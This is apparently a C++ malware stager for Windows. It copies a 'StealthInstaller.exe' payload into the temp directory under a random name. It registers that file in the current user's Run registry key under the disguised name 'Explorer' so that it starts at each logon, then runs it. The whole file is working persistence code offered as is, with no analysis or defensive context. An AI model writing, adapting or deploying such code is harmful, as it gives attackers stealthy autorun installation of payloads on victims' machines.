#include <iostream>
#include <Windows.h>
#include <time.h>
#define INSTALLER_NAME "StealthInstaller.exe"
#define REGVALUE_NAME "Explorer"
char TemporaryPath[MAX_PATH + sizeof(INSTALLER_NAME) + 1] = { 0 };


void CreateRandomName(DWORD NameLength, const char* NameExtension, char* NameBuffer) {
	char RandomizedName[MAX_PATH] = { 0 };
	int NameIndex = 0;
	const char CharacterSet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_";
	if (NameBuffer != NULL && NameLength != 0) {
		srand((unsigned int)time(NULL));
		for (; NameIndex < NameLength; NameIndex++) {
			RandomizedName[NameIndex] = CharacterSet[rand() % (sizeof(CharacterSet) - 1)];
		}
		RandomizedName[NameIndex] = '\0';
		if (NameBuffer != NULL) {
			strcat_s(RandomizedName, NameExtension);
		}
		RtlCopyMemory(NameBuffer, RandomizedName, strlen(RandomizedName) + 1);
	}
}
int main() {
	const DWORD InstallerNameLength = 20;
	char StagerName[MAX_PATH] = { 0 };
	char DrivePrefix[4] = { 0 };
	char CopyCommand[MAX_PATH]="copy ";
	char RegistryCommand[MAX_PATH * 2] = "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Explorer\" /t REG_SZ /d ";
	char InstallerName[InstallerNameLength + 5] = { 0 };  // InstallerNameLength + .exe + \0
	HKEY AutorunKey = { 0 };
	LSTATUS LastError = 0;


	// Create path in registry:
	DWORD StringLength = GetTempPathA(MAX_PATH + sizeof(INSTALLER_NAME) + 1, TemporaryPath);
	if (StringLength == 0) {
		return GetLastError(); // String length is invalid
	}
	CreateRandomName(InstallerNameLength, ".exe", InstallerName);
	printf(InstallerName);
	strcat_s(TemporaryPath, InstallerName);
	strcat_s(RegistryCommand, TemporaryPath);
	strcat_s(RegistryCommand, " /f");
	system(RegistryCommand);


	// Copy installer into the right path:
	StringLength = GetModuleFileNameA(NULL, StagerName, MAX_PATH);
	if (StringLength == 0) {
		return GetLastError();
	}
	DrivePrefix[0] = StagerName[0];
	DrivePrefix[1] = ':';
	DrivePrefix[2] = '\\';
	strcat_s(CopyCommand, DrivePrefix);
	strcat_s(CopyCommand, INSTALLER_NAME);
	strcat_s(CopyCommand, " ");
	strcat_s(CopyCommand, TemporaryPath);
	system(CopyCommand);


	// Execute installer initially:
	return 	system(TemporaryPath);
}